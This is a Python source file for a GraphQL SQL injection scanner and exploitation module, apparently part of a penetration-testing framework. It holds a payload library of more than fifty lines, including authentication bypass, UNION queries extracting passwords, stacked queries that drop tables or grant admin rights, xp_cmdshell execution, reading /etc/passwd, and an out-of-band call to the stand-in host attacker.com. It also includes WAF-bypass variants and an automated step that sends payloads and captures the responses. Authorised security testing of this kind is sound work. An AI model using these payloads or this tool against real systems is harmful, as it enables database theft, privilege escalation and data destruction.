"""
GraphQL SQL Injection Detection Module

Implements GraphQL-specific SQL injection detection and exploitation
using the 6-step methodology from the InjectionAttackModule framework.
"""

import re
import json
import logging
from typing import Dict, List, Any, Tuple, Optional

import requests

from .injection_contexts.base import (
    InjectionAttackModule,
    InjectionContextType,
    InjectionResult,
    AttackVector,
)

logger = logging.getLogger(__name__)

# Maximum number of characters from a response body that will be included
# in log messages / evidence details to avoid leaking sensitive content.
_MAX_LOG_RESPONSE_CHARS = 500

# Maximum number of GraphQL error messages to store in evidence details
# to avoid excessive memory usage.
_MAX_EVIDENCE_ERRORS = 5


# ---------------------------------------------------------------------------
# GraphQL-Specific Payload Library (50+ payloads)
# ---------------------------------------------------------------------------

GRAPHQL_SQL_INJECTION_PAYLOADS: List[str] = [
    # Basic authentication bypass
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "1' OR '1'='1'#",
    "1' OR '1'='1'/*",
    "' OR 1=1--",
    "' OR 1=1#",

    # UNION-based extraction
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "1' UNION SELECT username,password FROM users--",
    "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
    "1' UNION SELECT column_name,NULL FROM information_schema.columns--",

    # Error-based (MySQL)
    "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--",
    "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",

    # Error-based (PostgreSQL)
    "1' AND 1=CAST((SELECT version()) AS INT)--",
    "1'; SELECT CAST(version() AS INT)--",

    # Boolean-based blind
    "1' AND 1=1--",
    "1' AND 1=2--",
    "1' AND SUBSTRING(@@version,1,1)='5'--",
    "1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--",

    # Time-based blind (MySQL)
    "1' AND SLEEP(5)--",
    "1'; WAITFOR DELAY '0:0:5'--",
    "1' AND IF(1=1,SLEEP(5),0)--",
    "1' AND IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--",

    # Time-based blind (PostgreSQL)
    "1'; SELECT pg_sleep(5)--",
    "1' AND 1=(SELECT 1 FROM pg_sleep(5))--",

    # Stacked queries
    "1'; INSERT INTO users VALUES('hacked','hacked')--",
    "1'; UPDATE users SET password='hacked' WHERE '1'='1'--",
    "1'; DROP TABLE users--",

    # Variable injection
    "1' OR '1'='1'--",
    "' OR ''='",
    "'; EXEC xp_cmdshell('dir')--",

    # Fragment / field injection
    "password(where: {id: {_eq: \"1' UNION SELECT password FROM admin--\"}})",
    "id: \"1' OR 1=1--\"",
    "name: \"' OR 'x'='x'--\"",

    # Introspection-based attacks
    "1' UNION SELECT type_name,NULL FROM information_schema.types--",
    "1' UNION SELECT routine_name,NULL FROM information_schema.routines--",

    # WAF bypass variants
    "1'/**/OR/**/'1'='1",
    "1'%20OR%20'1'='1",
    "1' OR/*comment*/'1'='1'--",
    "1' /*!OR*/ '1'='1'--",
    "1'%09OR%09'1'='1'--",

    # Batching attack payloads
    "1' OR '1'='1'; SELECT sleep(0)--",
    "1'; SELECT 1--",

    # Mutation injection
    "hacked@evil.com' OR '1'='1",
    "hacked'); DELETE FROM users WHERE ('1'='1",
    "hacked'); UPDATE users SET role='admin' WHERE ('1'='1",

    # Out-of-band
    "1' UNION SELECT LOAD_FILE('/etc/passwd')--",
    "1'; EXEC master..xp_dirtree '//attacker.com/share'--",
    "1' AND 1=LOAD_FILE(0x2f6574632f706173737764)--",

    # Hex-encoded
    "1' UNION SELECT 0x61646d696e,0x70617373776f7264--",

    # Second-order
    "admin'--",
    "admin'#",
    "' OR username IS NOT NULL--",
]


GRAPHQL_BATCHING_PAYLOADS: List[str] = [
    '1\' OR \'1\'=\'1',
    '1\' OR \'1\'=\'1\'--',
    '1\' AND SLEEP(5)--',
]

GRAPHQL_VARIABLE_PAYLOADS: List[Dict[str, str]] = [
    {"id": "1' OR '1'='1--"},
    {"id": "1' AND SLEEP(5)--"},
    {"username": "admin'--"},
    {"username": "' OR 1=1--"},
    {"email": "test@test.com' OR '1'='1"},
]

GRAPHQL_INTROSPECTION_PAYLOADS: List[str] = [
    """{ __schema { types { name fields { name } } } }""",
    """{ __type(name: "User") { fields { name type { name } } } }""",
]

GRAPHQL_MUTATION_PAYLOADS: List[str] = [
    "mutation { createUser(input: {email: \"test' OR '1'='1\", password: \"test\"}) { id } }",
    "mutation { login(username: \"admin'--\", password: \"anything\") { token } }",
    "mutation { updateUser(id: \"1' OR '1'='1\", data: {role: \"admin\"}) { id } }",
]


# ---------------------------------------------------------------------------
# GraphQL injection context
# ---------------------------------------------------------------------------

class GraphQLInjectionModule(InjectionAttackModule):
    """
    GraphQL SQL injection detection module.

    Identifies GraphQL endpoints, maps fields to SQL injection points, and
    tests payloads via query batching, variable injection, fragment injection,
    introspection, and mutation injection.
    """

    GRAPHQL_ENDPOINT_INDICATORS = [
        "/graphql",
        "/api/graphql",
        "/v1/graphql",
        "/query",
        "/gql",
    ]

    def get_context_type(self) -> InjectionContextType:
        return InjectionContextType.GRAPHQL

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _load_payloads(self) -> List[str]:
        return list(GRAPHQL_SQL_INJECTION_PAYLOADS)

    def _load_detection_patterns(self) -> List[Dict[str, Any]]:
        return [
            # MySQL-specific
            {"pattern": r"sql syntax", "type": "sql_error", "confidence": 0.95},
            {"pattern": r"mysql_fetch", "type": "sql_error", "confidence": 0.95},
            {"pattern": r"mysql_num_rows", "type": "sql_error", "confidence": 0.90},
            {"pattern": r"supplied argument is not a valid MySQL", "type": "sql_error", "confidence": 0.95},
            {"pattern": r"you have an error in your sql", "type": "sql_error", "confidence": 0.98},
            {"pattern": r"warning.*mysql", "type": "sql_error", "confidence": 0.90},
            # Oracle-specific
            {"pattern": r"ORA-\d{5}", "type": "sql_error", "confidence": 0.98},
            {"pattern": r"oracle\.jdbc", "type": "sql_error", "confidence": 0.90},
            # PostgreSQL-specific
            {"pattern": r"pg_query\(\)", "type": "sql_error", "confidence": 0.90},
            {"pattern": r"pg_exec\(\)", "type": "sql_error", "confidence": 0.90},
            {"pattern": r"PSQLException", "type": "sql_error", "confidence": 0.90},
            {"pattern": r"invalid input syntax for.*integer", "type": "sql_error", "confidence": 0.85},
            {"pattern": r"column.*does not exist", "type": "sql_error", "confidence": 0.80},
            {"pattern": r"relation.*does not exist", "type": "sql_error", "confidence": 0.80},
            # Microsoft SQL Server-specific
            {"pattern": r"Microsoft SQL", "type": "sql_error", "confidence": 0.95},
            {"pattern": r"SQLSTATE", "type": "sql_error", "confidence": 0.85},
            {"pattern": r"unclosed quotation mark", "type": "sql_error", "confidence": 0.95},
            # SQLite-specific
            {"pattern": r"SQLite3::", "type": "sql_error", "confidence": 0.90},
            # Generic
            {"pattern": r"syntax error.*query", "type": "sql_error", "confidence": 0.85},
            {"pattern": r"quoted string not properly terminated", "type": "sql_error", "confidence": 0.90},
            # GraphQL error patterns indicating payload reached SQL layer
            {"pattern": r"\"errors\":\[", "type": "graphql_error", "confidence": 0.60},
            {"pattern": r"internal server error", "type": "server_error", "confidence": 0.50},
            # Data exfiltration indicators
            {"pattern": r"password", "type": "data_leak", "confidence": 0.70},
            {"pattern": r"secret", "type": "data_leak", "confidence": 0.65},
            {"pattern": r"root:x:0:0", "type": "data_leak", "confidence": 0.99},
        ]

    # ------------------------------------------------------------------
    # Endpoint detection
    # ------------------------------------------------------------------

    def detect_graphql_endpoint(self, base_url: str) -> bool:
        """
        Detect whether the target URL is a GraphQL endpoint.

        Args:
            base_url: URL to check

        Returns:
            True if the endpoint appears to be GraphQL
        """
        for indicator in self.GRAPHQL_ENDPOINT_INDICATORS:
            if indicator in base_url.lower():
                return True

        # Send introspection probe
        try:
            probe = {"query": "{__typename}"}
            resp = requests.post(
                base_url,
                json=probe,
                timeout=self.config.get("timeout", 10),
                headers={"Content-Type": "application/json"},
            )
            body = resp.text
            if '"__typename"' in body or '"data"' in body:
                return True
        except Exception:
            pass

        return False

    def introspect_schema(self, endpoint_url: str) -> Dict[str, Any]:
        """
        Retrieve the GraphQL schema via introspection.

        Args:
            endpoint_url: GraphQL endpoint URL

        Returns:
            Dictionary describing discovered types and fields
        """
        query = """
        {
          __schema {
            types {
              name
              kind
              fields {
                name
                args { name type { name kind } }
                type { name kind }
              }
            }
          }
        }
        """
        schema: Dict[str, Any] = {"types": [], "injectable_fields": []}
        try:
            resp = requests.post(
                endpoint_url,
                json={"query": query},
                timeout=self.config.get("timeout", 10),
                headers={"Content-Type": "application/json"},
            )
            data = resp.json()
            types_data = data.get("data", {}).get("__schema", {}).get("types", [])
            schema["types"] = types_data
            # Mark fields accepting String/ID args as potentially injectable
            for type_def in types_data:
                for field in type_def.get("fields") or []:
                    for arg in field.get("args") or []:
                        type_name = (arg.get("type") or {}).get("name") or ""
                        if type_name.upper() in ("STRING", "ID", "INT"):
                            schema["injectable_fields"].append(
                                {
                                    "type": type_def["name"],
                                    "field": field["name"],
                                    "arg": arg["name"],
                                    "arg_type": type_name,
                                }
                            )
        except Exception as exc:
            logger.debug("GraphQL introspection failed: %s", exc)

        return schema

    # ------------------------------------------------------------------
    # Payload builders
    # ------------------------------------------------------------------

    def build_query_payloads(self, field: str, arg: str, payload: str) -> List[str]:
        """Build GraphQL query strings for a given field/arg/payload."""
        return [
            f'{{ {field}({arg}: "{payload}") {{ id name }} }}',
            f'{{ {field}({arg}: {json.dumps(payload)}) {{ id name }} }}',
        ]

    def build_batching_attack(self, field: str, arg: str, payload: str, count: int = 10) -> List[Dict[str, Any]]:
        """Build a batching attack (array of queries)."""
        single = {"query": f'{{ {field}({arg}: "{payload}") {{ id name }} }}'}
        return [single] * min(count, 50)

    def build_variable_query(self, field: str, arg: str, arg_type: str, payload: str) -> Tuple[str, Dict[str, Any]]:
        """Build a GraphQL query using variables."""
        query = f'query($val: {arg_type}!) {{ {field}({arg}: $val) {{ id name }} }}'
        variables = {"val": payload}
        return query, variables

    def build_fragment_query(self, type_name: str, field: str, arg: str, payload: str) -> str:
        """Build a GraphQL query using inline fragments."""
        return (
            f"fragment sqli on {type_name} {{ "
            f'  {field}(where: {{ {arg}: {{ _eq: "{payload}" }} }}) '
            f"}} "
            f"{{ ... sqli }}"
        )

    def build_mutation_payloads(self, payload: str) -> List[str]:
        """Return mutation-style payloads."""
        return [
            f'mutation {{ login(username: "{payload}", password: "x") {{ token }} }}',
            f'mutation {{ createUser(email: "{payload}", password: "x") {{ id }} }}',
            f'mutation {{ updateUser(id: "{payload}") {{ id }} }}',
        ]

    # ------------------------------------------------------------------
    # Six-Step Methodology
    # ------------------------------------------------------------------

    def step1_supply_payloads(self, parameter_value: str) -> List[str]:
        """Step 1: Return GraphQL-specific SQL injection payloads."""
        return self.payloads

    def step2_detect_anomalies(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_response: Optional[Tuple[str, float]] = None,
    ) -> Tuple[bool, List[str]]:
        """Step 2: Detect SQL error or data-leak indicators in GraphQL responses."""
        anomalies: List[str] = []

        for pattern_info in self.detection_patterns:
            if re.search(pattern_info["pattern"], response_body, re.IGNORECASE):
                anomalies.append(f"{pattern_info['type']}: {pattern_info['pattern']}")

        # Timing-based detection
        if baseline_response:
            _, baseline_time = baseline_response
            if response_time > baseline_time + 4.5:
                anomalies.append(
                    f"time_based: Response delayed by {response_time - baseline_time:.2f}s"
                )

        # Content-size change
        if baseline_response:
            baseline_body, _ = baseline_response
            size_diff = abs(len(response_body) - len(baseline_body))
            content_change_threshold = self.config.get("content_change_threshold", 200)
            if size_diff > content_change_threshold:
                anomalies.append(f"content_change: Response size changed by {size_diff} bytes")

        return len(anomalies) > 0, anomalies

    def step3_extract_evidence(
        self,
        response_body: str,
        anomalies: List[str],
    ) -> Dict[str, Any]:
        """Step 3: Extract SQL error details and confidence score.

        Parses both raw SQL error strings and structured GraphQL JSON error
        objects.  Individual error *messages* are extracted from the
        ``errors`` array (up to :data:`_MAX_EVIDENCE_ERRORS`) so that callers
        get actionable DBMS details without storing raw, potentially sensitive
        response content verbatim.
        """
        evidence: Dict[str, Any] = {
            "error_type": "graphql_sqli",
            "details": {},
            "context_info": {},
            "confidence": 0.0,
        }

        # Try to parse JSON errors – extract individual message strings
        try:
            data = json.loads(response_body)
            errors = data.get("errors", [])
            if errors:
                messages = [
                    e.get("message", "")
                    for e in errors
                    if isinstance(e, dict) and e.get("message")
                ]
                # Store a limited number of messages to avoid sensitive leakage
                evidence["details"]["graphql_errors"] = messages[:_MAX_EVIDENCE_ERRORS]
                evidence["confidence"] = max(evidence["confidence"], 0.60)
                # Boost confidence when error messages contain SQL keywords
                for msg in messages:
                    if re.search(
                        r"sql|syntax|query|column|table|relation|ORA-|SQLSTATE",
                        msg,
                        re.IGNORECASE,
                    ):
                        evidence["confidence"] = max(evidence["confidence"], 0.80)
                        break
        except Exception:
            pass

        # SQL error patterns – DBMS-specific signatures for higher-confidence matches.
        # Each entry is (pattern, dbms_name_or_None, confidence_score).
        # Patterns are listed in priority order; matching stops at the first hit.
        _DBMS_SQL_PATTERNS = [
            # MySQL
            (r"you have an error in your sql", "MySQL", 0.98),
            (r"mysql_fetch", "MySQL", 0.95),
            (r"mysql_num_rows", "MySQL", 0.92),
            (r"warning.*mysql", "MySQL", 0.90),
            # Oracle
            (r"ORA-\d{5}", "Oracle", 0.98),
            (r"oracle\.jdbc", "Oracle", 0.90),
            # PostgreSQL
            (r"PSQLException", "PostgreSQL", 0.92),
            (r"pg_query\(\)", "PostgreSQL", 0.90),
            (r"pg_exec\(\)", "PostgreSQL", 0.90),
            (r"invalid input syntax for.*integer", "PostgreSQL", 0.85),
            (r"column.*does not exist", "PostgreSQL", 0.80),
            (r"relation.*does not exist", "PostgreSQL", 0.80),
            # Microsoft SQL Server
            (r"unclosed quotation mark", "MSSQL", 0.95),
            (r"Microsoft SQL", "MSSQL", 0.95),
            (r"SQLSTATE", "MSSQL", 0.85),
            # SQLite
            (r"SQLite3::", "SQLite", 0.90),
            # Generic (no DBMS attribution)
            (r"syntax error.*query", None, 0.88),
            (r"quoted string not properly terminated", None, 0.88),
        ]
        for pattern, dbms_name, conf in _DBMS_SQL_PATTERNS:
            match = re.search(pattern, response_body, re.IGNORECASE)
            if match:
                # Store only the matched portion (avoids storing full response)
                evidence["details"]["sql_error"] = match.group(0)[:_MAX_LOG_RESPONSE_CHARS]
                evidence["confidence"] = max(evidence["confidence"], conf)
                if dbms_name:
                    evidence["context_info"]["dbms"] = dbms_name
                break

        # Version / data leak
        version_match = re.search(r"\d+\.\d+\.\d+-\w+", response_body)
        if version_match:
            evidence["details"]["db_version_hint"] = version_match.group(0)
            evidence["confidence"] = max(evidence["confidence"], 0.85)

        # Confidence from anomalies
        for anomaly in anomalies:
            if "sql_error" in anomaly:
                evidence["confidence"] = max(evidence["confidence"], 0.90)
            elif "data_leak" in anomaly:
                evidence["confidence"] = max(evidence["confidence"], 0.80)
            elif "time_based" in anomaly:
                evidence["confidence"] = max(evidence["confidence"], 0.75)

        evidence["details"]["anomalies"] = anomalies
        return evidence

    def step4_mutate_and_verify(
        self,
        target_url: str,
        parameter_name: str,
        parameter_type: str,
        parameter_value: str,
        successful_payload: str,
        http_method: str = "POST",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Tuple[bool, float, str]:
        """Step 4: Verify the vulnerability using boolean logic variations."""
        true_payload = f"{parameter_value}' AND '1'='1"
        false_payload = f"{parameter_value}' AND '1'='2"

        req_headers = {"Content-Type": "application/json"}
        if headers:
            req_headers.update(headers)

        def send_query(payload: str) -> str:
            query = {"query": f'{{ user(id: "{payload}") {{ id name }} }}'}
            try:
                resp = requests.post(
                    target_url,
                    json=query,
                    headers=req_headers,
                    cookies=cookies,
                    timeout=self.config.get("timeout", 10),
                )
                return resp.text
            except Exception:
                return ""

        true_response = send_query(true_payload)
        false_response = send_query(false_payload)

        # If responses differ, the injection is boolean-confirmed
        confirmed = len(true_response) != len(false_response) and len(true_response) > 10
        confidence = 0.85 if confirmed else 0.50
        details = (
            f"Boolean verification: true_len={len(true_response)}, false_len={len(false_response)}"
        )
        return confirmed, confidence, details

    def step5_build_poc(
        self,
        vulnerable_parameter: str,
        successful_payload: str,
        evidence: Dict[str, Any],
    ) -> Dict[str, Any]:
        """Step 5: Build a safe, demonstrable proof-of-concept."""
        poc_query = f'{{ user(id: "{successful_payload}") {{ id name email }} }}'
        return {
            "poc_payload": successful_payload,
            "graphql_query": poc_query,
            "expected_result": "SQL error or boolean difference in GraphQL response",
            "safety_notes": "Read-only proof-of-concept; does not modify data",
            "reproduction_steps": [
                f"1. Send GraphQL POST with variable '{vulnerable_parameter}': {successful_payload}",
                "2. Observe response for SQL error messages or data differences",
                "3. Compare true/false boolean payloads to confirm injection",
            ],
        }

    def step6_automated_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        poc_payload: str,
        evidence: Dict[str, Any],
        http_method: str = "POST",
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Optional[Dict[str, Any]]:
        """Step 6: Exploitation automation (read-only)."""
        try:
            req_headers = {"Content-Type": "application/json"}
            if headers:
                req_headers.update(headers)
            extract_query = (
                f'{{ user(id: "{poc_payload}") {{ id name email }} }}'
            )
            resp = requests.post(
                target_url,
                json={"query": extract_query},
                headers=req_headers,
                cookies=cookies,
                timeout=self.config.get("timeout", 10),
            )
            return {
                "success": True,
                "data_extracted": {"raw_response": resp.text[:2000]},
                "impact_level": "high",
                "remediation": [
                    "Use parameterised / prepared GraphQL resolvers.",
                    "Validate and sanitise all GraphQL arguments.",
                    "Disable introspection in production environments.",
                    "Deploy a WAF with GraphQL-aware rules.",
                ],
            }
        except Exception as exc:
            return {
                "success": False,
                "data_extracted": {},
                "impact_level": "unknown",
                "remediation": [],
                "error": str(exc),
            }

    # ------------------------------------------------------------------
    # Compatibility methods
    # ------------------------------------------------------------------

    def analyze_response(
        self,
        response_body: str,
        response_headers: Dict[str, str],
        response_time: float,
        baseline_time: Optional[float] = None,
    ) -> tuple:
        """Analyze response for GraphQL SQL injection indicators (backward compat)."""
        baseline = ("", baseline_time) if baseline_time else None
        detected, anomalies = self.step2_detect_anomalies(
            response_body, response_headers, response_time, baseline
        )
        if not detected:
            return False, 0.0, "No GraphQL SQL injection detected"
        evidence = self.step3_extract_evidence(response_body, anomalies)
        evidence_str = (
            f"GraphQL SQLi detected. confidence={evidence['confidence']:.2f}. "
            f"anomalies={', '.join(anomalies[:3])}"
        )
        return True, evidence["confidence"], evidence_str

    def attempt_exploitation(
        self,
        target_url: str,
        vulnerable_parameter: str,
        parameter_type: str,
        successful_payload: str,
    ) -> Optional[Dict[str, Any]]:
        """Attempt safe read-only exploitation of a confirmed GraphQL SQLi."""
        evidence: Dict[str, Any] = {}
        poc = self.step5_build_poc(vulnerable_parameter, successful_payload, evidence)
        return self.step6_automated_exploitation(
            target_url,
            vulnerable_parameter,
            parameter_type,
            poc["poc_payload"],
            evidence,
        )

    # ------------------------------------------------------------------
    # Convenience: full-scan helper
    # ------------------------------------------------------------------

    def scan_endpoint(
        self,
        endpoint_url: str,
        field: str = "user",
        arg: str = "id",
        arg_type: str = "String",
    ) -> List[InjectionResult]:
        """
        Run a complete GraphQL SQL injection scan against a single field/arg.

        Args:
            endpoint_url: GraphQL endpoint URL
            field: Top-level query field to inject into
            arg: Argument name to inject into
            arg_type: GraphQL type of the argument

        Returns:
            List of successful InjectionResult objects
        """
        results: List[InjectionResult] = []

        # Baseline request
        baseline_body = ""
        baseline_time = 0.0
        try:
            t0 = __import__("time").time()
            r = requests.post(
                endpoint_url,
                json={"query": f'{{ {field}({arg}: "safe_value") {{ id name }} }}'},
                headers={"Content-Type": "application/json"},
                timeout=self.config.get("timeout", 10),
            )
            baseline_time = __import__("time").time() - t0
            baseline_body = r.text
        except Exception:
            pass

        for payload in self.payloads[:20]:  # Test first 20 for speed
            query_str, variables = self.build_variable_query(field, arg, arg_type, payload)
            try:
                import time as _time

                t0 = _time.time()
                resp = requests.post(
                    endpoint_url,
                    json={"query": query_str, "variables": variables},
                    headers={"Content-Type": "application/json"},
                    timeout=self.config.get("timeout", 10),
                )
                elapsed = _time.time() - t0
                body = resp.text

                detected, anomalies = self.step2_detect_anomalies(
                    body, dict(resp.headers), elapsed, (baseline_body, baseline_time)
                )

                if detected:
                    evidence = self.step3_extract_evidence(body, anomalies)
                    attack_vector = AttackVector(
                        context_type=InjectionContextType.GRAPHQL,
                        parameter_name=arg,
                        parameter_type="GraphQL_VARIABLE",
                        payload=payload,
                        description=f"GraphQL variable injection on field {field}.{arg}",
                    )
                    result = InjectionResult(
                        success=True,
                        context_type=InjectionContextType.GRAPHQL,
                        attack_vector=attack_vector,
                        evidence=str(evidence),
                        confidence_score=evidence.get("confidence", 0.0),
                        response_time=elapsed,
                        response_status=resp.status_code,
                        response_body=body[:_MAX_LOG_RESPONSE_CHARS],
                        response_headers=dict(resp.headers),
                        metadata={"anomalies": anomalies, "graphql_field": field, "graphql_arg": arg},
                    )
                    results.append(result)

            except Exception as exc:
                logger.debug("GraphQL payload test failed: %s", exc)

        return results
